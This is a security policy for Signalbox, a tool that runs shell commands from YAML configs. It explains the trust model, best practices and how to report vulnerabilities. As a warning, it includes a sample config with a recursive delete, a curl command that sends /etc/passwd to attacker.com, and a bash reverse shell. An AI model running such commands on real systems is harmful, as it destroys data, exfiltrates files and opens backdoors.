Possible blacklist for inline commands? (rm,chmod, etc. instead of pure trust)

# Security Policy

## Supported Versions

| Version | Supported          |
| ------- | ------------------ |
| 0.1.x   | :white_check_mark: |

## Security Model

### Command Execution Architecture

Signalbox runs the shell commands in the YAML configuration files. It uses the Python `subprocess` module with `shell=True`. Thus, you can use these shell features:

- **Pipes and redirection**: `command1 | command2`, `output > file`
- **Command chaining**: `cmd1 && cmd2`, `cmd1 || cmd2`
- **Environment variable expansion**: `$HOME`, `${VAR}`
- **Bash scripts with more than one line**: loops and conditions
- **Shell built-in commands**: for example, `cd` and `export`

**These features have important security risks.**

## Threat Model

### What Signalbox Protects Against

✅ **Python object deserialization attacks**: signalbox uses only `yaml.safe_load()`.  
✅ **Directory traversal in logs**: task names and group names can have only letters, digits, `_`, `-` and `.`. They cannot have `/` or start with `.`. Thus, a name cannot move a log path, alert path or export path out of its directory.  
✅ **Tasks that do not stop**: each task has a time limit (300 seconds by default). Only `timeout: 0` removes it.  
✅ **Resource exhaustion**: signalbox deletes old logs and limits the log size.  
✅ **Time limits near zero by accident**: signalbox increases a time limit below `execution.min_timeout` (1 second by default) to that value.  
✅ **Disk filling attacks**: each log file has a maximum size (5 MB by default). **Caution:** this limit does not limit memory. Signalbox keeps all of the output in memory while the task runs.  
✅ **Unauthorized log access**: signalbox makes log files with the permissions 0o600.  
✅ **Race conditions in log rotation**: a file lock prevents damage when two runs delete old logs at the same time.

### What Signalbox Does NOT Protect Against

❌ **Malicious YAML configuration files**: signalbox trusts all configuration files.  
❌ **Privilege escalation**: signalbox runs with the permissions of the user.  
❌ **Network attacks**: signalbox does not isolate scripts from the network.  
❌ **Supply chain attacks**: signalbox trusts system commands, for example `curl` and `jq`.

## Critical Security Requirements

### 🔴 YAML Configuration Files Must Be Trusted

**Signalbox has NO sandbox and does NOT examine commands.** It runs each command in a YAML file with all the permissions of the user who starts signalbox.

**Examples of dangerous commands:**
```yaml
tasks:
  - name: dangerous_deletion
    command: rm -rf /important/directory
    description: This WILL delete the directory
  
  - name: data_exfiltration
    command: curl https://attacker.com/steal?data=$(cat /etc/passwd)
    description: This WILL send sensitive data to remote server
  
  - name: reverse_shell
    command: bash -i >& /dev/tcp/attacker.com/4444 0>&1
    description: This WILL create a backdoor
```

### Security Best Practices

#### 1. **Protect Configuration Files**

```bash
# Set restrictive permissions on config directory
chmod 700 ~/.config/signalbox/
chmod 600 ~/.config/signalbox/config/*.yaml

# Or for system-wide installations
sudo chown root:root /etc/signalbox/
sudo chmod 755 /etc/signalbox/
sudo chmod 644 /etc/signalbox/config/*.yaml
```

#### 2. **Use Version Control**

```bash
# Track all config changes
cd ~/.config/signalbox
git init
git add config/
git commit -m "Initial signalbox configuration"

# Review all changes before deployment
git diff HEAD config/
```

#### 3. **Code Review Configuration Changes**

- Do not copy YAML files from sources that you do not trust.
- Read each `command:` field before you add it to your configuration.
- For team configurations, examine each change in a pull request.

#### 4. **Principle of Least Privilege**

```bash
# Create a dedicated user for signalbox
sudo useradd -m -s /bin/bash signalbox-runner
sudo -u signalbox-runner signalbox group run monitoring

# Use sudo only for specific commands
tasks:
  - name: update_packages
    command: sudo /usr/local/bin/safe-update.sh
    description: Run pre-approved update script
```

#### 5. **Validate Configuration Before Deployment**

```bash
# Always validate before running
signalbox validate

# Review what will execute: every task and group with its source file
signalbox task list
signalbox group list

# Review global settings
signalbox config show
```

#### 6. **Monitor Execution**

```bash
# Check logs regularly for unexpected behavior
signalbox log show task-name
signalbox log history task-name
signalbox log list --failed

# Follow new runs of a task as they happen
signalbox log tail task-name
```

#### 7. **Limit Script Complexity**

If possible, put complex logic in a separate script file:

```yaml
# BETTER: Call a controlled script
tasks:
  - name: backup_database
    command: /usr/local/bin/backup-db.sh
    description: Runs vetted backup script

# AVOID: Complex inline commands
tasks:
  - name: backup_database
    command: |
      for db in $(mysql -e 'show databases' | tail -n+2); do
        mysqldump $db > /backups/$db-$(date +%Y%m%d).sql
      done
    description: Complex inline bash
```

## Known Limitations

### Shell Injection Not Prevented

Signalbox does **not** have a command sandbox or an allowlist. This is intentional, for these reasons:

1. **Flexibility**: automation tasks use all the features of the shell.
2. **Compatibility**: limits on commands stop scripts that work now.
3. **Trust model**: signalbox treats configuration files as code, as Docker and make treat Dockerfiles and Makefiles.
4. **False security**: it is easy to go around a denylist or an allowlist. These lists can make users think that they are safe when they are not.

### Mitigation: Configuration-as-Code

Apply the same security rules to YAML configuration files as to source code:
- **Examine** all changes.
- **Test** in an isolated environment.
- **Audit** the configuration regularly.
- **Limit** write access.

## Reporting Vulnerabilities

### Scope

We accept security reports about:
- Vulnerabilities in the signalbox code, for example in configuration parsing or in log files
- Bugs that can cause signalbox to run a command that the user did not configure
- Permission problems or isolation problems in signalbox

We do **not** accept reports about:
- "Signalbox runs the commands in the YAML files". This is the design.
- Vulnerabilities in scripts that users write
- Problems in third-party commands that scripts use

### How to Report

**For security issues in Signalbox's code:**
- Email: [your-security-email@example.com]
- Or use GitHub Security Advisories (private reports)

**Response time:** 48 hours

### Disclosure Policy

- We tell you that we received the report in 48 hours or less.
- We try to send a first assessment in 7 days or less.
- We agree the disclosure date with you.
- We disclose the problem after a fix is available, usually in 30 to 90 days.

## Security Checklist for Deployment

Before you use signalbox in production, do these steps:

- [ ] Keep the configuration files in version control.
- [ ] Set the file permissions: 700 for directories, 600 for files.
- [ ] Examine each configuration change before you use it.
- [ ] Run signalbox as a user with the minimum privileges.
- [ ] Monitor the logs.
- [ ] Schedule regular audits.
- [ ] Write an incident response plan.
- [ ] Train your team about the security risks.
- [ ] Keep the test environment separate from production.
- [ ] Make a backup plan.
- [ ] Set a minimum time limit, to prevent denial of service.
- [ ] Set a maximum log file size, to prevent a full disk.
- [ ] Make sure that the log file permissions are 0o600.

## Built-in Security Mitigations

Signalbox has these protections against usual attacks:

### 1. Timeouts
**Problem:** a command that does not stop can stop its group from continuing.  
**Mitigation:** each task has the time limit `execution.default_timeout` (300 seconds), or its own `timeout`.
Signalbox increases a value below `min_timeout` to `min_timeout`. `timeout: 0` removes the time limit.
`min_timeout` does not prevent this. Thus, examine each task that uses `timeout: 0`.
```yaml
execution:
  default_timeout: 300  # Applied to every task without its own timeout
  min_timeout: 1        # Smallest non-zero timeout allowed
```

### 2. Disk Exhaustion Protection  
**Problem:** a large script output can fill the disk.  
**Mitigation:** each log file has a maximum size. Signalbox removes the middle of output that is too large, and adds a marker.
```yaml
logging:
  max_file_size_mb: 5  # Truncates output exceeding this size
```

### 3. Log File Access Control
**Problem:** log files can have sensitive command output.  
**Mitigation:** signalbox makes log files with the permissions `0o600`. Only the owner can read and write them.
```bash
# Log files are automatically created with restrictive permissions
ls -l ~/.config/signalbox/logs/*/
# Output: -rw------- (only owner can read/write)
```

### 4. Concurrent Execution Safety
**Problem:** if two runs delete old logs at the same time, they can damage the log directory.  
**Mitigation:** a file lock lets only one run at a time delete old logs.
- Signalbox uses `fcntl.flock()`.
- If the lock is not available, signalbox does not wait. Thus, deadlocks cannot occur.
- If signalbox cannot delete old logs, the task result does not change.

## Comparison to Similar Tools

| Tool | Command Execution | Security Model |
|------|------------------|----------------|
| **Signalbox** | Full shell, no sandboxing | Trust configuration files |
| **Cron** | Full shell, no sandboxing | Trust crontab entries |
| **Ansible** | Full shell, optional sandboxing | Trust playbooks |
| **Jenkins** | Full shell, optional sandboxing | Trust Jenkinsfiles |
| **Docker** | Full shell in container | Isolate via containers |
| **systemd** | Full shell, optional sandboxing | Trust unit files |

**Summary:** usually, configuration-as-code tools trust their configuration. Signalbox does the same.

## Future Considerations

We do not plan these security features now. We can add them in a later version:

- **An optional allowlist for commands**, with clear documentation of its limits
- **Signatures for configuration files**, and a check of these signatures
- **An audit log of all commands that signalbox runs**
- **SELinux or AppArmor isolation for processes**
- **A dry-run mode that shows what will change before signalbox runs it**

If we add these features, they will be optional. Thus, current configurations will continue to work.

---

**Last Updated:** December 29, 2025  
**Version:** 0.1.0
